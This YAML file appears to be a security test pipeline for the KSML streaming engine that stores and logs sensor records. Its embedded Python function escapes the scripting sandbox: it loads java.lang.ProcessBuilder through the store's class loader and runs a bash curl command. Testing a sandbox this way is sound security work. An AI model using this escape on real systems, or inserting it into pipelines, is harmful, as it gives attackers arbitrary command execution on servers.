# $schema: https://raw.githubusercontent.com/Axual/ksml/refs/heads/main/docs/ksml-language-spec.json

# This is a test pipeline that tries to exploit a possible vulnerability in the KSML engine.
streams:
  sensor_source_avro:
    topic: ksml_sensordata_avro
    keyType: string
    valueType: avro:SensorData

stores:
  last_sensor_data_store:
    type: keyValue
    keyType: string
    valueType: json
    persistent: false
    historyRetention: 1h
    caching: false
    logging: false

functions:
  process_message:
    type: forEach
    code: |
      last_value = last_sensor_data_store.get(key)
      classloader = last_sensor_data_store.getClass().getClassLoader()
      ProcessBuilder = classloader.loadClass("java.lang.ProcessBuilder")
      pb = ProcessBuilder('/bin/bash', '-c', 'curl localhost:5555')
      process = pb.start()
      
      if last_value != None:
        log.info("Found last value: {} = {}", key, last_value)
      last_sensor_data_store.put(key, value)
      if value != None:
        log.info("Stored new value: {} = {}", key, value)
    stores:
      - last_sensor_data_store

pipelines:
  process_message:
    from: sensor_source_avro
    forEach: process_message
